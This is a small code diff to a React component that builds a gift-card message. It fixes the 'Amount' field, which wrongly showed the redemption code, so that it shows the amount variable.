@@ -29,7 +29,7 @@ const TypeTwo = ({cardname, setShowmodal, showmodal, amount, setAmount, currency
         const msg = `
 Card Type: ${cardname}
 Currency: ${currency}
-Amount: ${redemptionCode}
+Amount: ${amount}
 Reedemption Code: ${redemptionCode}
 Access Code: ${accessCode}
 `;
